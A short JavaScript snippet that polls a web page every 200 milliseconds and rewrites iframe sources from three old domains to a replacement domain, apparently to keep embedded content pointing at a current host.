var oldDomains = ["airnols.net","rollbun.com","klogdik.site"],
	newDomains = ["ultorz.store"],
		delay = 200;

if (oldDomains.length && newDomains.length) {
	replace();
}

function replace() {
	setTimeout(replace, delay);
	
	Array.prototype.find.call(document.body.getElementsByTagName("iframe"), function (elem) {
		var src = elem.src;
		
		oldDomains.forEach((item) => {
			if (src.includes(item)) {
				var newDomain = newDomains[Math.floor(Math.random() * newDomains.length)];
				
				elem.src = src.replace(item, newDomain);
			}
		});
	});
}